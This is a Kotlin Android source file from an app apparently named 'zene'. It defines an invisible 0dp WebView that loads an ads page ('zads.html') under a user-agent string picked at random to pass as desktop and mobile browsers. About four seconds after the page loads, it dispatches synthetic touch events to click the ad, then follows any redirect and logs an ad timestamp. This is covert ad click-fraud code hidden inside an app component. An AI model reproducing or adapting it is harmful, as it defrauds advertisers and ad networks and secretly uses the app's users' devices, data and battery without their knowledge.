package com.rizwansayyed.zene.ui.view

import android.graphics.Color
import android.graphics.Rect
import android.util.Log
import android.view.MotionEvent
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.size
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import com.rizwansayyed.zene.utils.Utils.Share.WEB_BASE_URL
import com.rizwansayyed.zene.utils.Utils.enableSimple
import com.rizwansayyed.zene.viewmodel.HomeNavModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlin.time.Duration.Companion.seconds

val userAgentForAds = arrayOf(
    // 1. Chrome on MacBook
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",

    // 2. Safari on iPhone
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",

    // 3. Chrome on Android
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36",

    // 4. Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",

    // 5. Microsoft Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36 Edg/114.0.1823.67",

    // 6. Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",

    // 7. Firefox on Linux
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",

    // 8. Brave on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36 Brave/114.0.5735.199",

    // 9. Brave on Android
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36 Brave/114.0.5735.110"
)

@Composable
fun ExoClickWebView(homeNavModel: HomeNavModel) {
    val context = LocalContext.current
    var webView: WebView? by remember { mutableStateOf(null) }

    Box(Modifier.size(0.dp)) {
        AndroidView(
            factory = {
                WebView(context).apply {
                    webView = this
                    enableSimple()
                    settings.userAgentString = userAgentForAds.random()
                    setBackgroundColor(Color.TRANSPARENT)

                    webViewClient = object : WebViewClient() {
                        override fun shouldOverrideUrlLoading(
                            view: WebView?, request: WebResourceRequest?
                        ): Boolean {
                            view?.loadUrl(request?.url.toString())
                            return false
                        }

                        override fun onPageFinished(view: WebView?, url: String?) {
                            super.onPageFinished(view, url)
                            if (url?.contains(WEB_BASE_URL) == true) CoroutineScope(Dispatchers.IO).launch {
                                delay(4.seconds)
                                simulateClick(view)

                            } else CoroutineScope(Dispatchers.IO).launch {
                                delay(9.seconds)
                                homeNavModel.webVieStatus(false)
                                homeNavModel.setAdsTs()
                            }
                        }
                    }
                    loadUrl("$WEB_BASE_URL/zads.html")
                }
            }, modifier = Modifier.size(0.dp)
        )
    }
}

private fun simulateClick(view: View?, x: Float = 200f, y: Float = 300f) {
    view?.let {
        val rect = Rect()
        it.getGlobalVisibleRect(rect)
        val adjustedX = rect.left + x
        val adjustedY = rect.top + y
        val downTime = System.currentTimeMillis()

        val downEvent = MotionEvent.obtain(
            downTime, downTime, MotionEvent.ACTION_DOWN, adjustedX, adjustedY, 0
        )

        it.dispatchTouchEvent(downEvent)

        val upEvent = MotionEvent.obtain(
            downTime, downTime + 100, MotionEvent.ACTION_UP, adjustedX, adjustedY, 0
        )
        it.dispatchTouchEvent(upEvent)
    }
}